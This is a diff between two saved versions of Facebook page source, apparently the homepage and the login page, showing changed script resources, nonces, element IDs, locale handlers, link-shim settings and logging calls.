-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ik464\/yb\/l\/en_GB\/pR7-2vJCelr.js"
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4ih4R4\/yc\/l\/en_US\/pR7-2vJCelr.js"
                     },
                     "I+GHswV": {
                         "type": "js",
@@ -1512,34 +1703,6 @@
                         "type": "js",
                         "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yA\/r\/Y37sQzk-yb8.js"
                     },
-                    "Y7CydAx": {
-                        "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/y6\/r\/bz6gV1l3-TL.js"
-                    },
-                    "z3hBw8h": {
-                        "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yh\/r\/qkqnWEiZRwq.js"
-                    },
-                    "tADNV\/7": {
-                        "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yv\/r\/c9d-c2Xh_az.js"
-                    },
-                    "8Rq5kp2": {
-                        "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yX\/r\/R7paD7vUTA2.js"
-                    },
-                    "Uh9zPeg": {
-                        "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yi\/r\/fcnDhCsH9cT.js"
-                    },
-                    "zLQaNdg": {
-                        "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yW\/r\/rhZUiD8hJ72.js"
-                    },
-                    "T9BkhW+": {
-                        "type": "js",
-                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yJ\/r\/TJc3tU-0fV-.js"
-                    },
                     "H3fxfLR": {
                         "type": "js",
                         "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yI\/r\/BWAeojOuhn8.js"
@@ -1548,9 +1711,13 @@
                         "type": "js",
                         "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4\/yO\/r\/_tJ17sGyxOX.js"
                     },
+                    "pAOcHVz": {
+                        "type": "js",
+                        "src": "https:\/\/static.xx.fbcdn.net\/rsrc.php\/v4i4wF4\/y3\/l\/en_US\/e13i-_0nlO9.js"
+                    },
                     "P\/mr5VE": {
                         "type": "css",
-                        "src": "data:text\/css; charset=utf-8,",
+                        "src": "data:text\/css; charset=utf-8;base64,",
                         "d": 1
                     }
                 },
@@ -1689,12 +1856,12 @@
             })
         });
     </script>
-    <script nonce="UOCoxRtA">
+    <script nonce="FCNCmmhK">
         requireLazy(["InitialJSLoader"], function(InitialJSLoader) {
-            InitialJSLoader.loadOnDOMContentReady(["rBUHKbB", "6bFQpoa", "Scive\/5", "EEAX6B4", "03T3Wls", "ssGUSfp", "Y7CydAx", "z3hBw8h", "tADNV\/7", "8Rq5kp2", "Uh9zPeg", "lmnLTcE", "zLQaNdg", "T9BkhW+", "I+GHswV", "dAWNZ\/s", "2yz5u9G", "H3fxfLR", "zPYlTyl", "t8DfPeZ", "BdwbaRb", "P\/mr5VE"]);
+            InitialJSLoader.loadOnDOMContentReady(["rBUHKbB", "6bFQpoa", "Scive\/5", "EEAX6B4", "03T3Wls", "ssGUSfp", "I+GHswV", "dAWNZ\/s", "2yz5u9G", "H3fxfLR", "zPYlTyl", "pAOcHVz", "t8DfPeZ", "lmnLTcE", "BdwbaRb", "P\/mr5VE"]);
         });
     </script>
-    <script nonce="UOCoxRtA">
+    <script nonce="FCNCmmhK">
         requireLazy(["TimeSliceImpl", "ServerJS"], function(TimeSlice, ServerJS) {
             var s = (new ServerJS());
             s.handle({
@@ -1703,23 +1870,23 @@
                         "__rc": ["FBLynxLogging", null]
                     }, -1],
                     ["LinkshimHandlerConfig", [], {
-                        "supports_meta_referrer": true,
-                        "default_meta_referrer_policy": "origin-when-crossorigin",
+                        "supports_meta_referrer": false,
+                        "default_meta_referrer_policy": "default",
                         "switched_meta_referrer_policy": "origin",
-                        "non_linkshim_lnfb_mode": null,
-                        "link_react_default_hash": "AT0U-qdbHMZSWBSkb6TTukJxjKmYJMgURhY0xrUEsj5Q4MMZojs7WYmCTgUdVFyCEjaVPsQSoscJK7zt7J0fpoAAn_73wuNg1Di9oMCqKIO1eOyr5idjHG1UukOzCLWKsZytOJJHOj794WteeLmdGg",
-                        "untrusted_link_default_hash": "AT2QgOn5cqRxzbbhsnuODZY1wR6E977-SZoIkT0RhwUuQEcleTSzLIDZvqFZWX4kCkWSHzxssmwL5grH7Kt0PQmV2rDHt9uqoF6MOR4-0P50qZy4aEq5c_5__MembOVdZS0iVSUWCIAYGWyySYbG3g",
+                        "non_linkshim_lnfb_mode": "ie",
+                        "link_react_default_hash": "AT1L5ZWIH9MViRgsRRuGwKoCkEEuldihT-HkLUnjW2ykAXvs_kjWYd9W9wEM7fpq9xyWbqdoGdnKHj5MZjR_RpxprQNGZUL1ruSOEzLubHS1QAtxt9qkgLMMB--yIaWgYqQDJl41Vcsp4UoKGghIJ0EVq70DnnBW",
+                        "untrusted_link_default_hash": "AT1mok0DY7yrxbZJOsl5HP59Y1AlpYZvF79UkJp_Bem1QNtAfxjdbfneLhGj3LDKH6z-6WtRsvjzanS961fYTv5_Hw_JhPymkuul6Jt08bz7jRk5QN72318Cb_4GOcBJPmyUk9DuCvWsF2hEL4Xw-bNOzJnCSDb0",
                         "linkshim_host": "l.facebook.com",
                         "linkshim_path": "\/l.php",
                         "linkshim_enc_param": "h",
                         "linkshim_url_param": "u",
-                        "use_rel_no_opener": true,
-                        "use_rel_no_referrer": true,
-                        "always_use_https": true,
+                        "use_rel_no_opener": false,
+                        "use_rel_no_referrer": false,
+                        "always_use_https": false,
                         "onion_always_shim": true,
-                        "middle_click_requires_event": true,
-                        "www_safe_js_mode": "asynclazy",
-                        "m_safe_js_mode": "MLynx_asynclazy",
+                        "middle_click_requires_event": false,
+                        "www_safe_js_mode": "hover",
+                        "m_safe_js_mode": null,
                         "ghl_param_link_shim": false,
                         "click_ids": [],
                         "is_linkshim_supported": true,
@@ -1729,27 +1896,26 @@
                     }, 27]
                 ],
                 "elements": [
-                    ["__elem_a588f507_0_1_Ny", "u_0_1_Qb", 1],
-                    ["__elem_a588f507_0_0_Cd", "globalContainer", 1],
-                    ["__elem_a588f507_0_2_dF", "content", 1],
-                    ["__elem_835c633a_0_0_hn", "u_0_2_T9", 1],
-                    ["__elem_9f5fac15_0_0_X2", "passContainer", 1],
-                    ["__elem_558608f3_0_0_Zv", "inputPassword", 1],
-                    ["__elem_a588f507_0_3_LD", "u_0_3_Xt", 1],
-                    ["__elem_a588f507_0_4_7k", "u_0_4_5S", 1],
-                    ["__elem_45d73b5d_0_1_nZ", "u_0_5_+z", 2],
-                    ["__elem_072b8e64_0_0_Ep", "u_0_6_o8", 1],
-                    ["__elem_45d73b5d_0_0_3g", "u_0_0_Ut", 1],
-                    ["__elem_072b8e64_0_1_pd", "u_0_7_wD", 1],
-                    ["__elem_072b8e64_0_2_vY", "u_0_8_hD", 1],
-                    ["__elem_072b8e64_0_3_Ir", "u_0_9_kz", 1],
-                    ["__elem_072b8e64_0_4_Nr", "u_0_a_E\/", 1],
-                    ["__elem_072b8e64_0_5_hw", "u_0_b_ff", 1],
-                    ["__elem_072b8e64_0_6_p5", "u_0_c_KS", 1],
-                    ["__elem_072b8e64_0_7_6B", "u_0_d_hV", 1],
-                    ["__elem_072b8e64_0_8_6n", "u_0_e_Tx", 1],
-                    ["__elem_072b8e64_0_9_J5", "u_0_f_5J", 1],
-                    ["__elem_072b8e64_0_a_8I", "u_0_g_Ci", 1]
+                    ["__elem_a588f507_0_1_Dn", "u_0_0_jK", 1],
+                    ["__elem_a588f507_0_0_YN", "globalContainer", 1],
+                    ["__elem_a588f507_0_2_Qj", "content", 1],
+                    ["__elem_835c633a_0_0_Do", "login_form", 2],
+                    ["__elem_f46f4946_0_0_\/D", "u_0_1_Eq", 1],
+                    ["__elem_f46f4946_0_1_PH", "u_0_2_Mh", 1],
+                    ["__elem_70b16c69_0_0_D1", "inputPassword", 1],
+                    ["__elem_a588f507_0_3_b8", "u_0_3_i\/", 1],
+                    ["__elem_a588f507_0_4_1B", "u_0_4_7q", 1],
+                    ["__elem_45d73b5d_0_0_XW", "loginbutton", 1],
+                    ["__elem_072b8e64_0_0_p0", "u_0_5_+z", 1],
+                    ["__elem_072b8e64_0_1_L6", "u_0_6_uD", 1],
+                    ["__elem_072b8e64_0_2_42", "u_0_7_3M", 1],
+                    ["__elem_072b8e64_0_3_of", "u_0_8_hN", 1],
+                    ["__elem_072b8e64_0_4_np", "u_0_9_JD", 1],
+                    ["__elem_072b8e64_0_5_eU", "u_0_a_sR", 1],
+                    ["__elem_072b8e64_0_6_\/h", "u_0_b_L5", 1],
+                    ["__elem_072b8e64_0_7_lF", "u_0_c_5V", 1],
+                    ["__elem_072b8e64_0_8_LT", "u_0_d_Hr", 1],
+                    ["__elem_072b8e64_0_9_AA", "u_0_e_vb", 1]
                 ],
                 "require": [
                     ["ServiceWorkerLoginAndLogout", "login", [],
@@ -1759,18 +1925,18 @@
                         [false]
                     ],
                     ["ScriptPath", "set", [],
-                        ["XIndexReduxController", "a1f3c513", {
-                            "imp_id": "034vT3NlCWYpvVBi8",
+                        ["XWebLoginController", "96e88af3", {
+                            "imp_id": "1tTJCE40eclgyHDk8",
                             "ef_page": null,
-                            "uri": "https:\/\/www.facebook.com\/"
+                            "uri": "https:\/\/www.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp\u00253Blwv=120&amp\u00253Blwc=1348131"
                         }]
                     ],
                     ["UITinyViewportAction", "init", [],
                         []
                     ],
-                    ["ResetScrollOnUnload", "init", ["__elem_a588f507_0_0_Cd"],
+                    ["ResetScrollOnUnload", "init", ["__elem_a588f507_0_0_YN"],
                         [{
-                            "__m": "__elem_a588f507_0_0_Cd"
+                            "__m": "__elem_a588f507_0_0_YN"
                         }]
                     ],
                     ["KeyboardActivityLogger", "init", [],
@@ -1785,40 +1951,77 @@
                     ["HardwareCSS", "init", [],
                         []
                     ],
-                    ["CAALegacyLoggingUtils", "attachEventOnClickListener", ["__elem_072b8e64_0_0_Ep"],
+                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_0_p0"],
                         [{
-                            "__m": "__elem_072b8e64_0_0_Ep"
-                        }, "forgot_password_button_clicked"]
+                            "__m": "__elem_072b8e64_0_0_p0"
+                        }, "fr_CA", "en_US", false, "www_list_selector", "https:\/\/fr-ca.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp\u00253Blwv=120&amp\u00253Blwc=1348131", 0]
                     ],
-                    ["CAALegacyLoggingUtils", "attachEventOnClickListener", ["__elem_45d73b5d_0_0_3g"],
+                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_1_L6"],
                         [{
-                            "__m": "__elem_45d73b5d_0_0_3g"
-                        }, "sign_up_button_clicked"]
+                            "__m": "__elem_072b8e64_0_1_L6"
+                        }, "es_LA", "en_US", false, "www_list_selector", "https:\/\/es-la.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp\u00253Blwv=120&amp\u00253Blwc=1348131", 1]
                     ],
-                    ["CAALegacyLoggingUtils", "attachEventOnClickListener", ["__elem_45d73b5d_0_1_nZ"],
+                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_2_42"],
                         [{
-                            "__m": "__elem_45d73b5d_0_1_nZ"
-                        }, "login_button_clicked"]
+                            "__m": "__elem_072b8e64_0_2_42"
+                        }, "zh_CN", "en_US", false, "www_list_selector", "https:\/\/zh-cn.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp\u00253Blwv=120&amp\u00253Blwc=1348131", 2]
+                    ],
+                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_3_of"],
+                        [{
+                            "__m": "__elem_072b8e64_0_3_of"
+                        }, "ko_KR", "en_US", false, "www_list_selector", "https:\/\/ko-kr.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp\u00253Blwv=120&amp\u00253Blwc=1348131", 3]
+                    ],
+                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_4_np"],
+                        [{
+                            "__m": "__elem_072b8e64_0_4_np"
+                        }, "ja_JP", "en_US", false, "www_list_selector", "https:\/\/ja-jp.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp\u00253Blwv=120&amp\u00253Blwc=1348131", 4]
+                    ],
+                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_5_eU"],
+                        [{
+                            "__m": "__elem_072b8e64_0_5_eU"
+                        }, "pt_BR", "en_US", false, "www_list_selector", "https:\/\/pt-br.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp\u00253Blwv=120&amp\u00253Blwc=1348131", 5]
+                    ],
+                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_6_\/h"],
+                        [{
+                            "__m": "__elem_072b8e64_0_6_\/h"
+                        }, "de_DE", "en_US", false, "www_list_selector", "https:\/\/de-de.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp\u00253Blwv=120&amp\u00253Blwc=1348131", 6]
+                    ],
+                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_7_lF"],
+                        [{
+                            "__m": "__elem_072b8e64_0_7_lF"
+                        }, "it_IT", "en_US", false, "www_list_selector", "https:\/\/it-it.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp\u00253Blwv=120&amp\u00253Blwc=1348131", 7]
+                    ],
+                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_8_LT"],
+                        [{
+                            "__m": "__elem_072b8e64_0_8_LT"
+                        }, "ar_AR", "en_US", false, "www_list_selector", "https:\/\/ar-ar.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp\u00253Blwv=120&amp\u00253Blwc=1348131", 8]
+                    ],
+                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_9_AA"],
+                        [{
+                            "__m": "__elem_072b8e64_0_9_AA"
+                        }, "hi_IN", "en_US", false, "www_list_selector", "https:\/\/hi-in.facebook.com\/login\/device-based\/regular\/login\/?login_attempt=1&amp\u00253Blwv=120&amp\u00253Blwc=1348131", 9]
+                    ],
+                    ["FBLynx", "setupDelegation", [],
+                        []
+                    ],
+                    ["TimezoneAutoset", "setInputValue", ["__elem_f46f4946_0_0_\/D"],
+                        [{
+                            "__m": "__elem_f46f4946_0_0_\/D"
+                        }, 1740880281]
+                    ],
+                    ["ScreenDimensionsAutoSet", "setInputValue", ["__elem_f46f4946_0_1_PH"],
+                        [{
+                            "__m": "__elem_f46f4946_0_1_PH"
+                        }]
                     ],
                     ["LoginInitialLoadLogger", "onLoad", [],
-                        ["homepage"]
+                        ["login"]
                     ],
-                    ["CAAWebLoggingUtils", "logLoginEvent", [],
+                    ["LoginFormController", "init", ["__elem_835c633a_0_0_Do", "__elem_45d73b5d_0_0_XW"],
                         [{
-                            "event": "login_step_view_loaded",
-                            "event_flow": "login_manual",
-                            "event_step": "home_page",
-                            "event_category": "login_home_page_init",
-                            "extra_client_data": {
-                                "path": "\/"
-                            }
-                        }, 0]
-                    ],
-                    ["LoginFormController", "init", ["__elem_835c633a_0_0_hn", "__elem_45d73b5d_0_1_nZ"],
-                        [{
-                            "__m": "__elem_835c633a_0_0_hn"
+                            "__m": "__elem_835c633a_0_0_Do"
                         }, {
-                            "__m": "__elem_45d73b5d_0_1_nZ"
+                            "__m": "__elem_45d73b5d_0_0_XW"
                         }, null, true, {
                             "pubKey": {
                                 "publicKey": "dabff049cd01c531625761d1d3dd4b4187d59cd97cbc96d7f7280beea9420b4c",
@@ -1826,9 +2029,14 @@
                             }
                         }, false]
                     ],
+                    ["PlatformDialogCBTSetter", "setCBTInFormAndLog", ["__elem_835c633a_0_0_Do"],
+                        [{
+                            "__m": "__elem_835c633a_0_0_Do"
+                        }, "client_logged_out_init_impression"]
+                    ],
                     ["BrowserPrefillLogging", "initContactpointFieldLogging", [],
                         [{
-                            "contactpointFieldID": "inputUsername",
+                            "contactpointFieldID": "email",
                             "serverPrefill": ""
                         }]
                     ],
@@ -1837,72 +2045,17 @@
                             "passwordFieldID": "inputPassword"
                         }]
                     ],
-                    ["FocusListener"],
-                    ["FlipDirectionOnKeypress"],
-                    ["LoginFormToggle", "initToggle", ["__elem_a588f507_0_3_LD", "__elem_a588f507_0_4_7k", "__elem_558608f3_0_0_Zv", "__elem_9f5fac15_0_0_X2"],
+                    ["LoginFormToggle", "initToggle", ["__elem_a588f507_0_3_b8", "__elem_a588f507_0_4_1B", "__elem_70b16c69_0_0_D1"],
                         [{
-                            "__m": "__elem_a588f507_0_3_LD"
+                            "__m": "__elem_a588f507_0_3_b8"
                         }, {
-                            "__m": "__elem_a588f507_0_4_7k"
+                            "__m": "__elem_a588f507_0_4_1B"
                         }, {
-                            "__m": "__elem_558608f3_0_0_Zv"
-                        }, {
-                            "__m": "__elem_9f5fac15_0_0_X2"
+                            "__m": "__elem_70b16c69_0_0_D1"
                         }]
                     ],
-                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_1_pd"],
-                        [{
-                            "__m": "__elem_072b8e64_0_1_pd"
-                        }, "id_ID", "en_GB", false, "www_list_selector", "https:\/\/id-id.facebook.com\/", 0]
-                    ],
-                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_2_vY"],
-                        [{
-                            "__m": "__elem_072b8e64_0_2_vY"
-                        }, "jv_ID", "en_GB", false, "www_list_selector", "https:\/\/jv-id.facebook.com\/", 1]
-                    ],
-                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_3_Ir"],
-                        [{
-                            "__m": "__elem_072b8e64_0_3_Ir"
-                        }, "ms_MY", "en_GB", false, "www_list_selector", "https:\/\/ms-my.facebook.com\/", 2]
-                    ],
-                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_4_Nr"],
-                        [{
-                            "__m": "__elem_072b8e64_0_4_Nr"
-                        }, "ja_JP", "en_GB", false, "www_list_selector", "https:\/\/ja-jp.facebook.com\/", 3]
-                    ],
-                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_5_hw"],
-                        [{
-                            "__m": "__elem_072b8e64_0_5_hw"
-                        }, "ar_AR", "en_GB", false, "www_list_selector", "https:\/\/ar-ar.facebook.com\/", 4]
-                    ],
-                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_6_p5"],
-                        [{
-                            "__m": "__elem_072b8e64_0_6_p5"
-                        }, "fr_FR", "en_GB", false, "www_list_selector", "https:\/\/fr-fr.facebook.com\/", 5]
-                    ],
-                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_7_6B"],
-                        [{
-                            "__m": "__elem_072b8e64_0_7_6B"
-                        }, "es_LA", "en_GB", false, "www_list_selector", "https:\/\/es-la.facebook.com\/", 6]
-                    ],
-                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_8_6n"],
-                        [{
-                            "__m": "__elem_072b8e64_0_8_6n"
-                        }, "ko_KR", "en_GB", false, "www_list_selector", "https:\/\/ko-kr.facebook.com\/", 7]
-                    ],
-                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_9_J5"],
-                        [{
-                            "__m": "__elem_072b8e64_0_9_J5"
-                        }, "pt_BR", "en_GB", false, "www_list_selector", "https:\/\/pt-br.facebook.com\/", 8]
-                    ],
-                    ["IntlUtils", "initOnClickHandler", ["__elem_072b8e64_0_a_8I"],
-                        [{
-                            "__m": "__elem_072b8e64_0_a_8I"
-                        }, "de_DE", "en_GB", false, "www_list_selector", "https:\/\/de-de.facebook.com\/", 9]
-                    ],
-                    ["FBLynx", "setupDelegation", [],
-                        []
-                    ],
+                    ["FocusListener"],
+                    ["FlipDirectionOnKeypress"],
                     ["RequireDeferredReference", "unblock", [],
                         [
                             ["FbtLogging", "IntlQtEventFalcoEvent"], "sd"
@@ -1921,10 +2074,10 @@
                 ],
                 "contexts": [
                     [{
-                        "__m": "__elem_a588f507_0_1_Ny"
+                        "__m": "__elem_a588f507_0_1_Dn"
                     }, true],
                     [{
-                        "__m": "__elem_a588f507_0_2_dF"
+                        "__m": "__elem_a588f507_0_2_Qj"
                     }, true]
                 ]
             });
@@ -1935,7 +2088,7 @@
             });
         });
     </script>
-    <script nonce="UOCoxRtA">
+    <script nonce="FCNCmmhK">
         now_inl = (function() {
             var p = window.performance;
             return p && p.now && p.timing && p.timing.navigationStart ? function() {
@@ -1946,13 +2099,18 @@
         })();
         window.__bigPipeFR = now_inl();
     </script>
-    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v5/yh/l/0,cross/ze2gDvq5tcz.css" as="style" crossorigin="anonymous" />
-    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v5/y2/l/0,cross/mmo1oTsuuHp.css" as="style" crossorigin="anonymous" />
-    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v5/yJ/l/0,cross/-MH6mY1Za_K.css" as="style" crossorigin="anonymous" />
-    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v5/yr/l/0,cross/r8l0oY44Pwc.css" as="style" crossorigin="anonymous" />
-    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v4/y1/r/lEiu2wBgF_k.js" as="script" crossorigin="anonymous" nonce="UOCoxRtA" />
-    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v4ij9m4/ya/l/en_GB/EAEmq6z9X2U.js" as="script" crossorigin="anonymous" nonce="UOCoxRtA" />
-    <script nonce="UOCoxRtA">
+    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v5/yg/l/0,cross/0apHDjQm9uC.css"
+        as="style" crossorigin="anonymous">
+    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v5/yh/l/0,cross/GoSQySihKx7.css"
+        as="style" crossorigin="anonymous">
+    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v5/yW/l/0,cross/UNRLHEeLAlH.css"
+        as="style" crossorigin="anonymous">
+    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v5/yo/l/0,cross/BmlJrCjPDL7.css"
+        as="style" crossorigin="anonymous">
+    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v4/y1/r/lEiu2wBgF_k.js" as="script" crossorigin="anonymous" nonce="FCNCmmhK">
+    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v4i7M54/y0/l/en_US/EAEmq6z9X2U.js"
+        as="script" crossorigin="anonymous" nonce="FCNCmmhK">
+    <script nonce="FCNCmmhK">
         window.__bigPipeCtor = now_inl();
         requireLazy(["BigPipe"], function(BigPipe) {
             define("__bigPipe", [], window.bigPipe = new BigPipe({
@@ -1964,7 +2122,7 @@
             }));
         });
     </script>
-    <script nonce="UOCoxRtA">
+    <script nonce="FCNCmmhK">
         (function() {
             var n = now_inl();
             requireLazy(["__bigPipe"], function(bigPipe) {
@@ -1972,10 +2130,10 @@
             })
         })();
     </script>
-    <script nonce="UOCoxRtA">
+    <script nonce="FCNCmmhK">
         requireLazy(["__bigPipe"], (function(bigPipe) {
             bigPipe.onPageletArrive({
-                displayResources: ["n+36Djy", "wXaVolg", "fpPjFBD", "/Bigw6+", "Scive/5", "6bFQpoa", "P/mr5VE"],
+                displayResources: ["wXaVolg", "u4F94Jx", "fpPjFBD", "/Bigw6+", "Scive/5", "6bFQpoa", "P/mr5VE"],
                 id: "first_response",
                 phase: 0,
                 last_in_phase: true,
@@ -1988,16 +2146,16 @@
                         }
                     }
                 },
-                allResources: ["rBUHKbB", "6bFQpoa", "Scive/5", "EEAX6B4", "03T3Wls", "n+36Djy", "wXaVolg", "fpPjFBD", "/Bigw6+", "ssGUSfp", "Y7CydAx", "z3hBw8h", "tADNV/7", "8Rq5kp2", "Uh9zPeg", "lmnLTcE", "zLQaNdg", "T9BkhW+", "I+GHswV", "dAWNZ/s", "2yz5u9G", "H3fxfLR", "zPYlTyl", "P/mr5VE", "t8DfPeZ", "BdwbaRb"]
+                allResources: ["wXaVolg", "u4F94Jx", "fpPjFBD", "rBUHKbB", "6bFQpoa", "Scive/5", "EEAX6B4", "03T3Wls", "/Bigw6+", "ssGUSfp", "I+GHswV", "dAWNZ/s", "2yz5u9G", "H3fxfLR", "zPYlTyl", "pAOcHVz", "P/mr5VE", "t8DfPeZ", "lmnLTcE", "BdwbaRb"]
             });
         }));
     </script>
-    <script nonce="UOCoxRtA">
+    <script nonce="FCNCmmhK">
         requireLazy(["__bigPipe"], function(bigPipe) {
-            bigPipe.setPageID("7477026657047531021")
+            bigPipe.setPageID("7477023874000637589")
         });
     </script>
-    <script nonce="UOCoxRtA">
+    <script nonce="FCNCmmhK">
         (function() {
             var n = now_inl();
             requireLazy(["__bigPipe"], function(bigPipe) {
@@ -2005,7 +2163,7 @@
             })
         })();
     </script>
-    <script nonce="UOCoxRtA">
+    <script nonce="FCNCmmhK">
         requireLazy(["__bigPipe"], (function(bigPipe) {
             bigPipe.onPageletArrive({
                 displayResources: ["lmnLTcE"],
@@ -2071,47 +2229,8 @@
                             also_record_new_timeslice_format: false,
                             force_async_request_tracing_on: false
                         }, 2609],
-                        ["InstagramUserAgent", [], {
-                            is_chrome: true,
-                            is_edge: false,
-                            is_edge_chromium_based: false,
-                            is_edge_legacy: false,
-                            is_firefox: false,
-                            is_ig_carbon: false,
-                            is_ig_lite: false,
-                            is_ig_webview: false,
-                            is_barcelona_webview: false,
-                            is_igtv_webview: false,
-                            is_in_app_browser: false,
-                            is_ios: false,
-                            is_android: false,
-                            is_windows_nt: true,
-                            is_ipad: false,
-                            is_macos: false,
-                            is_mobile: false,
-                            is_mobile_safari: false,
-                            is_oculus_browser: false,
-                            is_opera: false,
-                            is_safari: false,
-                            is_supported_browser: true,
-                            is_twitter_webview: false,
-                            is_uc_browser: false,
-                            is_vapid_eligible: true,
-                            is_webview: false,
-                            is_windows_pwa: false,
-                            is_igvr: false,
-                            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
-                        }, 6088],
-                        ["PolarisSiteData", [], {
-                            country_code: null,
-                            device_id: "",
-                            machine_id: "",
-                            send_device_id_header: false,
-                            e2e_config: null,
-                            use_server_machine_id: false
-                        }, 7369],
                         ["IntlCurrentLocale", [], {
-                            code: "en_GB"
+                            code: "en_US"
                         }, 5954],
                         ["BDSignalCollectionData", [], {
                             sc: "{\"t\":1659080345,\"c\":[[30000,838801],[30001,838801],[30002,838801],[30003,838801],[30004,838801],[30005,838801],[30006,573585],[30007,838801],[30008,838801],[30012,838801],[30013,838801],[30015,806033],[30018,806033],[30021,540823],[30022,540817],[30040,806033],[30093,806033],[30094,806033],[30095,806033],[30101,541591],[30102,541591],[30103,541591],[30104,541591],[30106,806039],[30107,806039],[38000,541427],[38001,806643]]}",
@@ -2244,10 +2363,10 @@
                         ],
                         ["NavigationMetrics", "setPage", [],
                             [{
-                                page: "XIndexReduxController",
+                                page: "XWebLoginController",
                                 page_type: "normal",
-                                page_uri: "https://www.facebook.com/",
-                                serverLID: "7477026657047531021"
+                                page_uri: "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=120&amp;lwc=1348131",
+                                serverLID: "7477023874000637589"
                             }]
                         ],
                         ["FalcoLoggerTransports", "attach", [],
@@ -2257,17 +2376,17 @@
                             [{}]
                         ],
                         ["DimensionTracking"],
-                        ["ClickRefLogger"],
                         ["NavigationClickPointHandler"],
-                        ["ServiceWorkerURLCleaner", "removeRedirectID", [],
-                            []
-                        ],
                         ["WebDevicePerfInfoLogging", "doLog", [],
                             []
                         ],
                         ["WebStorageMonster", "schedule", [],
                             []
                         ],
+                        ["DeferredCookie", "addToQueue", [],
+                            ["_js_datr", "mbnDZ6uV698gpbmxgOennbfU", 34560000000, "/", true, false, true, ".facebook.com"]
+                        ],
+                        ["ClickRefLogger"],
                         ["Artillery", "disable", [],
                             []
                         ],
